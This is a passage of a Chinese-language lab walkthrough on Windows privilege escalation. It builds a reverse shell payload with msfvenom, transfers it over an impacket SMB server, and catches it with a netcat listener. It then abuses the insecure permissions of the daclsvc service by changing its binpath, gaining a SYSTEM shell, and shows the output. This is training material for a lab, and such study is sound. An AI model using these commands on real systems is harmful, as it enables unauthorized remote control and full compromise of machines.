# 生成反向shell

在 Kali 系统中，使用 msfvenom 生成反向 shell 可执行文件 (reverse.exe)。 相应地更新 LHOST IP 地址：

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

将 reverse.exe 文件传输到 Windows 系统的 C:\PrivEsc 目录。有很多方法可以实现这一点，但最简单的方法是在 Kali 系统上启动一个 SMB 服务器，并将其放置在与该文件相同的目录下，然后使用标准的 Windows 复制命令来传输该文件。

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

在 Windows 系统上（请将 IP 地址更新为您的 Kali IP 地址）：

```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

在 Kali 系统上设置 netcat 监听器来测试反向 shell：

```
sudo nc -nvlp 53
```

然后，在 Windows 系统上运行 reverse.exe 可执行文件，并获取 shell：

```
C:\PrivEsc\reverse.exe
```

![image-20260508160934461](./image/03Windows%20PrivEsc/image-20260508160934461.png)

# 服务利用 - 不安全的服务权限

使用 [accesschk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) 检查“user”帐户对“daclsvc”服务的权限：

```cmd
C:\Users\user\Desktop>C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc

RW daclsvc
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL
```

返回的信息可以通过查询[文档](https://learn.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights)得到

查询该服务并注意它以 SYSTEM 权限运行（SERVICE_START_NAME 服务运行账户）：

```cmd
C:\Users\user>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

修改服务配置，并将 BINARY_PATH_NAME（binpath）设置为您创建的 reverse.exe 可执行文件：

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

然后启动服务:

```
net start daclsvc
```

在 Kali 系统上启动监听器，以生成一个具有 SYSTEM 权限的反向 shell：

```bash
root@ip-10-146-95-204:~# sudo nc -nvlp 8888
sudo: unable to resolve host ip-10-146-95-204: Name or service not known
Listening on 0.0.0.0 8888
Connection received on 10.146.169.118 50138
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

# 服务利用 - 未加引号的服务路径

